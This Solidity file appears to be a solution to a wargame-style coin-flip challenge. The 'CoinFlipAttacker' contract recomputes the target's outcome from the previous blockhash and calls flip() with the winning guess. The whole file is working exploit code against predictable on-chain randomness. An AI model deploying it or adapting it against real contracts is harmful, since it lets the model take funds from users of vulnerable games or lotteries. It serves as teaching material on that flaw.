// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip{
  function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttacker {
  address victim;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor(address _coinFlip) {
    victim = _coinFlip;
  }

  function guess() internal view returns(bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    return side;
  }

  function attack() public {
    bool _guess = guess();
    ICoinFlip(victim).flip(_guess);
  }
}